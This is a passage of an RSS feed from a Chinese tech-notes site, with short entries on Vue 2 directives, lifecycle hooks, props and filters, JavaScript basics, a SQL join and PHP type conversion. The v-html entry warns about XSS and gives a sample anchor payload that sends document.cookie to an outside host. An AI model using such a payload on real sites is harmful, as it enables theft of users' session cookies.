      <description>非等值链接 查询员工的工资和工资级别，并按工资级别降序 SELECT salary,grade_level FROM employees AS e INNER JOIN job_grades AS g ON e.salary BETWEEN g.lowest_sal AND g.highest_sal ORDER BY grade_level DESC </description>
    </item>
    
    <item>
      <title>Vue Props</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/props/</link>
      <pubDate>Mon, 23 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/props/</guid>
      <description>Props 使组件接收外部传入的数据，且属性是只读的，不可更改的，这叫做单向数据流。若需要修改，可以配合data使用，间接修改props中的数据
一个组件的属性，应该避免被除了自身以外的组件所更改或控制。
若同时配置使用 data 和 props ，会优先使用props中的数据。
传递数据 &amp;lt;Sudent ref=&amp;#34;student&amp;#34; name=&amp;#34;Rainy&amp;#34; :age=&amp;#34;20&amp;#34; sex=&amp;#34;男&amp;#34;&amp;gt;&amp;lt;/Sudent&amp;gt; 接收数据 只接收数据 props: [&amp;#34;name&amp;#34;, &amp;#34;age&amp;#34;, &amp;#34;sex&amp;#34;], 指定属性值类型 props: {  name: String,  age: Number,  sex: String, }, 限制类型、必要性、指定默认值 props: {  name: {  type: String,  // 属性的值是必须的  required: true,  },  age: {  type: Number,  // 属性的默认值  default: 0,  },   sex: {  type: String,  required: true,  }, }, 间接修改 props 中的数据 使用 data间接的修改 props</description>
    </item>
    
    <item>
      <title>Vue 组件</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6/</link>
      <pubDate>Mon, 23 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6/</guid>
      <description>组件 用来实现局部（特定）功能效果的代码集合。
非单文件组件 一个文件中包含 N 个组件。
非单文件组件的弊端是：组件的样式没有被封装到当前文件中。
单文件组件 一个文件中只包含 1 个组件。且该文件是vue后缀的文件。
一个vue文件中包含着三大部分： template、style 以及 script。
&amp;lt;template&amp;gt; 	&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;/template&amp;gt;  &amp;lt;script&amp;gt; export default { 	template: ` &amp;lt;div&amp;gt; &amp;lt;h1 class=&amp;#39;h&amp;#39;&amp;gt;{{schoolName}}&amp;lt;/h1&amp;gt; &amp;lt;Student&amp;gt;&amp;lt;/Student&amp;gt; &amp;lt;/div&amp;gt; `, 	data() { 	return { 	schoolName: &amp;#39;学校&amp;#39;, 	}; 	}, 	components: { 	Student, 	}, }; &amp;lt;/script&amp;gt;  &amp;lt;style&amp;gt; .h1 { 	color: red; } &amp;lt;/style&amp;gt; 与 Vue 实例的区别 组件是可复用的 Vue 实例，组件的 options和 Vue 实例的options都是相同的。只有 el 和data配置不太一样。</description>
    </item>
    
    <item>
      <title>JavaScrip debugger</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5%E5%92%8C%E5%A3%B0%E6%98%8E/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5%E5%92%8C%E5%A3%B0%E6%98%8E/</guid>
      <description>debugger debugger 被调用时, 浏览器执行 JavaScrip 代码时会暂停在 debugger 语句的位置，并调用 (如果有) 浏览器的调试器进行调试。例如设置断点。</description>
    </item>
    
    <item>
      <title>JavaScript HTMLElement 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/htmlelement/htmlelement/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/htmlelement/htmlelement/</guid>
      <description>HTMLElement 方法 focus() 如果可以，将焦点聚焦在指定的元素上。
如果是创建的新元素，则必须先将创建的新元素插入到页面中，然后再执行focus()，焦点才能成功聚焦到这个新元素上。如果是先聚焦，再插入，焦点则不会聚焦到新元素上。</description>
    </item>
    
    <item>
      <title>Vs Code 使用技巧</title>
      <link>https://note.yxzi.xyz/note/technology/softwareuse/vscode/%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/softwareuse/vscode/%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</guid>
      <description>使用技巧 强行折叠代码块 #region // 折叠代码 #endregion </description>
    </item>
    
    <item>
      <title>Vue v-cloak</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-cloak/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-cloak/</guid>
      <description>v-cloak 一个没有值的指令。通常配合 CSS 一起用，可以隐藏未经 Vue 解析且带有{{}}的元素，直到 Vue 实例创建完毕。
Vue 实例创建完毕后，元素上的 v-cloak被删除。
HTML
&amp;lt;div v-cloak&amp;gt;  {{ message }} &amp;lt;/div&amp;gt; CSS
[v-cloak] { 	display: none; } 该div不会显示，直到 Vue 实例创建完毕。</description>
    </item>
    
    <item>
      <title>Vue v-html</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-html/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-html/</guid>
      <description>v-html 设置元素的 innerHTML，会覆盖元素中的所有内容。但与v-text不同的是，它会识别 HTML 元素
安全性 在网站上动态渲染任意 HTML 是非常危险的，因为容易导致 XSS 攻击。只在可信内容上使用 v-html，永不用在用户提交的内容上。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;div v-html=&amp;#34;msg&amp;#34;&amp;gt;原内容&amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({el: &amp;#39;#app&amp;#39;,data: {msg: &amp;#39;&amp;lt;a href=javascript:location.href=&amp;#34;http://www.baidu.com?&amp;#34; + document.cookie&amp;gt;XXS 攻击&amp;lt;/a&amp;gt; &amp;#39;,},});Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue v-once</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-once/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-once/</guid>
      <description>v-once 一个没有值的指令。只渲染当前元素一次。之后该元素被视为静态内容。可以用于优化性能。</description>
    </item>
    
    <item>
      <title>Vue v-pre</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-pre/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-pre/</guid>
      <description>v-pre 跳过当前元素和它的子元素的编译过程。使页面显示原始 Mustache 元素。
用于跳过大量没有使用指令的元素，这会加快编译速度。</description>
    </item>
    
    <item>
      <title>Vue v-text</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-text/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-text/</guid>
      <description>v-text 设置元素的文本内容。会覆盖元素中的所有内容。</description>
    </item>
    
    <item>
      <title>Vue 实例方法</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</guid>
      <description>实例方法 </description>
    </item>
    
    <item>
      <title>Vue 生命周期函数</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/</guid>
      <description>生命周期函数 在 Vue 的创建、使用、销毁过程中，会有许多事件，这些事件就被统称为生命周期函数，也叫作生命周期钩子。
生命周期函数的名字不可更改，但函数中的代码由我们自定义。
生命周期函数中的 this 的指向是 Vue 实例或组件实例对象。
beforeCreate() 在实例初始化之后，进行数据侦听和数据代理之前调用
created() 在实例创建完成后被立即同步调用。在这一步中，实例已完成对选项的处理，意味着以下内容已被配置完毕：数据侦听、计算属性、方法、事件/侦听器的回调函数。然而，挂载阶段还没开始，
beforeMount() 在挂载开始之前被调用。
mounted() 把初始的真实 DOM 树插入到页面后，即 Vue 实例挂载完毕后调用。
此时一般开始发送 Ajax 请求、启动定时器、绑定自定义事件、订阅消息等初始化操作。
beforeUpdate 在数据发生改变后，DOM 被更新之前被调用。此时的数据已经被改变，但页面中不是最新的数据。
updated() 此时的数据已经被改变，且页面中也是最新的数据。
beforeDestroy() 实例销毁之前调用。在这一步，实例仍然完全可用。但无法引起页面中的数据更新。
此时一般开始清除定时器、解绑自定义事件、取消订阅消息等收尾操作。
一般不在该流程操作数据，因为在此时改变数据，并不会引起页面中的数据更新。
destroyed() 实例销毁后调用。</description>
    </item>
    
    <item>
      <title>Vue 生命周期流程</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%B5%81%E7%A8%8B/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%B5%81%E7%A8%8B/</guid>
      <description>生命周期流程 flowchart TD;newVue[&amp;#34;new Vue()&amp;#34;] --&amp;gt; init[&amp;#34;初始化：事件、生命周期、但数据代理未开始。&amp;#34;];init --&amp;gt; beforeCraeate[&amp;#34;beforeCraeate()：此时无法通过 vm 访问 data 中的数据，以及 methods 中的方法。&amp;#34;];beforeCraeate --&amp;gt; againInit[&amp;#34;初始化：数据检测、数据代理。&amp;#34;];againInit ---&amp;gt;created[&amp;#34;created()：可以通过 vm 访问到 data 中的数据，以及 methods 中的方法。&amp;#34;];created --&amp;gt; 挂载流程开始挂载流程开始 --&amp;gt; el[&amp;#34;是否配置 el 选项？&amp;#34;]el --&amp;gt;|Yse| template[&amp;#34;是否配置 template 选项？&amp;#34;];el --&amp;gt;|No| $mount[&amp;#34;当 vm.$mount(el) 调用的时候&amp;#34;];$mount --&amp;gt;template;template --&amp;gt;|Yes| compileTemplate[&amp;#34;编译 template 到 render() 中&amp;#34;]compileTemplate --&amp;gt;stageOnetemplate --&amp;gt;|No|compileEl[&amp;#34;编译 el 指定元的outerHTML 作为 template&amp;#34;];compileEl --&amp;gt; stageOne[&amp;#34;此阶段 Vue 开始解析模板，生成虚拟 DOM（内存中），但页面还无法显示解析好的内容。&amp;#34;]stageOne ---&amp;gt;beforeMount[&amp;#34;beforeMount()：此时，页面呈现的是未经 Vue 编译的 DOM 结构。&amp;lt;/br&amp;gt; 此时，所有对 DOM 的操作，最终都没有效果（在 beforeMount 之前才有效果）。&amp;#34;];beforeMount --&amp;gt; $el[&amp;#34;将内存中的虚拟 DOM 转化为真实 DOM 插入到页面。（还将真实 DOM 拷贝了一份在 $el 中）&amp;#34;]$el --&amp;gt; mouted[&amp;#34;mouted()：页面中呈现的都是经过 Vue 编译到 DOM。&amp;lt;/br&amp;gt; 对 DOM 的操作均有效（但尽可能避免），至此初始化过程结束，一般在此进行：开启定时器、发送网络请求、订阅消息、绑定自定义事件等初始化操作。&amp;#34;]mouted ---&amp;gt;mountEnd[&amp;#34;mouted()：此时，挂载流程结束。更新流程开始&amp;#34;];mountEnd --&amp;gt; changes[&amp;#34;当 data 中的数据发生变化&amp;#34;];changes --&amp;gt; beforeUpdate[&amp;#34;beforeUpdate()：此时，data 中的数据是新的，但页面中的数据是旧的，即：页面尚未和最新的数据保持同步。&amp;#34;];beforeUpdate --&amp;gt; compareVNode[&amp;#34;根据新数据，生成新的虚拟 DOM，随后与旧的虚拟DOM进行比对，最终完成页面更新，即：完成了 Model —&amp;gt; view 的更新&amp;#34;];compareVNode --&amp;gt; updated[&amp;#34;updated()：此时，数据和页面都是最新的（方法和数据都可用，且能引起页面上的数据更新），即：页面和数据保持同步。&amp;#34;];updated --&amp;gt; mountEnd;updated ---&amp;gt; $destroy[&amp;#34;vm.</description>
    </item>
    
    <item>
      <title>Vue 自定义指令</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/</link>
      <pubDate>Sun, 22 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/</guid>
      <description>自定义指令 定义指令时，指令名不加v-，使用的时候需要加v-。
指令名如果是多个单词，多个单词用-隔开。
directives 局部自定义指令，一个指令就是一个函数或对象。
directives中出现的this 都指向 Window。
函数式 函数中有两个参数：
 element：指令所在的 DOM 元素。 binding：一个对象，其中的value 属性就是自定义指令的属性值。  会在什么时候被调用？
  指令与元素绑定成功时（初始化）会被调用。但此时元素还没有被 Vue 解析并插入到页面，这会导致在directives中，某些方法不能及时的生效。比如focus()。
  指令所在的模板被重新解析时。
  HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;h2&amp;gt;当前 n 的值为：{{n}}&amp;lt;/h2&amp;gt; 	&amp;lt;h3&amp;gt;放大十倍后的 n 为 ：&amp;lt;span v-big=&amp;#34;n&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/h3&amp;gt; 	&amp;lt;button @click=&amp;#34;n++&amp;#34;&amp;gt;点击后 n++&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	n: 1, 	}, 	directives: { 	big(element, binding) { 	element.</description>
    </item>
    
    <item>
      <title>JavaScript Math 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/math/math-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sat, 21 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/math/math-%E6%96%B9%E6%B3%95/</guid>
      <description>Math 方法 random() 返回一个 0（= 0）到 1（&amp;lt; 1）的随机数。
floor() 向下取整，返回一个小于或等于指定数字的最大整数。
ceil() 向上取整，返回一个大于或等于指定数字的最小整数。</description>
    </item>
    
    <item>
      <title>JavaScript 匿名函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sat, 21 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0/</guid>
      <description>匿名函数 指没有名称的函数。如果单独只写一个匿名函数，此时是不符合语法要求的会报错。
function () { 	console.log(&amp;#39;该函数会报错&amp;#39;); }; 需要给匿名函数包裹一个括号，使之成为函数表达式。
(function (a, b) { 	console.log(&amp;#39;匿名函数表达式&amp;#39;); })(); 也可以将一个匿名函数赋给一个变量，再通过变量来调用这个匿名函数。
var demo = function () { 	console.log(&amp;#39;匿名函数表达式&amp;#39;); }; demo(); </description>
    </item>
    
    <item>
      <title>JavaScript 回调函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sat, 21 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</guid>
      <description>回调函数 将 A 函数当作 B 函数的参数，并被 B 函数调用，则 A 函数是 B 函数的回调函数。
一般的函数调用，可以称作是调用，然而执行时才将某个函数传入再调用的调用方式，被称为回调。</description>
    </item>
    
    <item>
      <title>Vue v-bind</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-bind/</link>
      <pubDate>Sat, 21 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-bind/</guid>
      <description>v-bind 单项数据绑，数据只能从 data 流向页面。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;img v-bind:src=&amp;#34;url&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	url: &amp;#39;https://img1.baidu.com/it/u=999074466,1525171260&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=138&amp;amp;f=JPEG?w=500&amp;amp;h=333&amp;#39;, 	}, }); Vue.config.productionTip = false; 简写
&amp;lt;!-- 完整语法 --&amp;gt; &amp;lt;a v-bind:href=&amp;#34;url&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt;  &amp;lt;!-- 简写 --&amp;gt; &amp;lt;a :href=&amp;#34;url&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 过滤器</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/</link>
      <pubDate>Sat, 21 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/</guid>
      <description>过滤器 对数据进行格式化后再显示。
一般用在{{}}或v-bind之中，
过滤器不会改变原来的数据。
filters 局部过滤器，只能在啊当前 Vue 实例中使用的过滤器。它将|之前的数据当作参数，并传递给在|之后的过滤函数，并作为该过滤函数的参数。
过滤函数的返回值会被作为最终值解析到模板中。
传参 过滤函数除了可以将在|之前的数据当作第一个实参时，还能接受额外的其他参数。
串联 过滤器中的多个过滤函数可以串联，用|将不同的过滤器函数分开，前一个函数的返回值会被当作后一个函数的实参。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;!-- 过滤器 --&amp;gt; 	&amp;lt;h3&amp;gt;Vue - filters：{{time | timeFmt}}&amp;lt;/h3&amp;gt; 	&amp;lt;!-- 过滤器地传参 --&amp;gt; 	&amp;lt;h3&amp;gt;Vue - filters：{{time | timeFmt(&amp;#39;YYYY——MM——DD&amp;#39;)}}&amp;lt;/h3&amp;gt; 	&amp;lt;!-- 过滤器串联 --&amp;gt; 	&amp;lt;h3&amp;gt;Vue - filters：{{time | timeFmt(&amp;#39;YYYY——MM——DD&amp;#39;) | mySlice(&amp;#39;YYYY&amp;#39;)}}&amp;lt;/h3&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	msg: &amp;#39;局部过滤器&amp;#39;, 	time: 1653135479429, 	}, 	filters: { 	timeFmt(val, str = &amp;#39;YYYY年MM月DD日&amp;#39;) { 	return dayjs(val).</description>
    </item>
    
    <item>
      <title>递推</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E9%80%92%E6%8E%A8/</link>
      <pubDate>Sat, 21 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/%E9%80%92%E6%8E%A8/</guid>
      <description>递推 从初值出发反复进行某一运算得到所需的结果。
从已知到未知，从小到大（比如每年长高 9cm，20 则长高年 180 cm，30 年后则长高 270 cm）
function Recursion(n) { 	let start = 0; 	let fn = 1; 	for (let i = 0; i &amp;lt; n; i++) { 	let t = fn; 	console.log(t); 	fn = fn + start; 	start = t; 	} 	return fn; }  console.log(Recursion(5)); </description>
    </item>
    
    <item>
      <title>HTML input</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/input/</link>
      <pubDate>Fri, 20 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/input/</guid>
      <description>input 输入框。
为input 设置不同的 type 属性，可以变化为多种形态。
radio 单选框。
需要为多个单选按钮设置相同的 name 值。
性别： &amp;lt;input type=&amp;#34;radio&amp;#34; name=&amp;#34;sex&amp;#34; id=&amp;#34;&amp;#34; /&amp;gt; &amp;lt;input type=&amp;#34;radio&amp;#34; name=&amp;#34;sex&amp;#34; id=&amp;#34;&amp;#34; /&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 修饰符</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E4%BF%AE%E9%A5%B0%E7%AC%A6/</link>
      <pubDate>Fri, 20 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E4%BF%AE%E9%A5%B0%E7%AC%A6/</guid>
      <description>修饰符 lazy 默认情况下，v-model会实时的同步元素中的数据，但如果添加了lazy，则数据会在当前元素失去焦点的时候同步元素中的数据。
trim 自动过滤输入框中的首尾空白字符。
number 自动将输入框中的内容转为数值类型。
通常是将字符串转换为数值。</description>
    </item>
    
    <item>
      <title>Vue v-model</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/v-model/</link>
      <pubDate>Thu, 19 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/v-model/</guid>
      <description>v-model 双向数据绑定，常用于表单元素（有 value 值）。
双向绑定是指：数据不仅能从 data 流向页面，也能从页面流向 data。
该指令是v-on与v-bind的复合版。
&amp;lt;!-- 类似于语法糖的写法 --&amp;gt; &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h1&amp;gt;{{text}}&amp;lt;/h1&amp;gt;  &amp;lt;input type=&amp;#34;text&amp;#34; v-model=&amp;#34;text&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;!-- 相当于这样写--&amp;gt; &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h1&amp;gt;{{text}}&amp;lt;/h1&amp;gt;  &amp;lt;input type=&amp;#34;text&amp;#34; :value=&amp;#34;text&amp;#34; @input=&amp;#34;text = $event.target.value&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 收集表单数据</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE/</link>
      <pubDate>Thu, 19 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE/</guid>
      <description>收集表单数据 用 v-model 在表单 input textarea及 select 上创建双向数据绑定。它会根据控件类型自动选取正确的方法来更新元素。
type = radio 则v-mode1收 集的是value值，且要给不同的&amp;lt;input type=&amp;quot;radio&amp;quot; /&amp;gt;配置 相同的value 值。
type = checkbox  没有配置 input 的value属性，那么v-mode1收集的就是一个布尔值（勾选 or 未勾选，） 配置input的value属性:  v- mode1的初始值是非数组，那么收集的就是布尔值（勾选 or 未勾选） v-mode1的初始值是数组，那么v-mode1收集的的就是value的属性值所组成的数组。    备注: v-mode1 的 三个修饰符:
 lazy:失去焦点再收集数据 number:输入字符串转为有效的数字 trim:输入首尾空格过滤  HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.</description>
    </item>
    
    <item>
      <title>Vue 数据响应式</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/</link>
      <pubDate>Thu, 19 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/</guid>
      <description>数据响应式 data 发生变化，视图会自动变化。
数据代理 通过一个对象代理对另一个对象中的属性的操作（读/写）.
在 Vue 中，通过 vm 来代理 data 中的属性操作（即操作 vm，就相当于操作 data），使我们更加方便的操作 data 中的数据。
// 通过 obj2 访问或修改 obj1 中的 x  var obj = { x: 100 }; var obj2 = { y: 200 };  // 给 obj2 定义一个新的属性 x Object.defineProperty(obj2, &amp;#39;x&amp;#39;, { 	get() { 	// 当访问 obj2.x 时，返回 100，并将 100 赋给 obj2.x， 	return obj.x; 	},  	// 当 obj2.x 被修改，该方法会调用，value 是修改后的新值 	set(value) { 	// 将新值赋给 obj.</description>
    </item>
    
    <item>
      <title>PHP 转换数据类型</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E8%BD%AC%E6%8D%A2%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Wed, 18 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E8%BD%AC%E6%8D%A2%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid>
      <description>转换数据类型 在很多的条件下，需要将指定的数据类型，转换成目标数据类型。
自动转换 系统根据需求判定并转换（用的比较多，效率偏低）。
$a = &amp;#39;abc1.1.1&amp;#39;; $b = &amp;#39;1.1.1abc&amp;#39;;  // 0 + 1.1 echo $a + $b; 强制转换 它会先复制一份需要被转换的数据，然后在对这份被复制的数据进行处理（不会处理实际的数据，它处理的是自己拷贝的）。
() 在变量之前增加一个 ()，括号中的参数为目标数据类型。
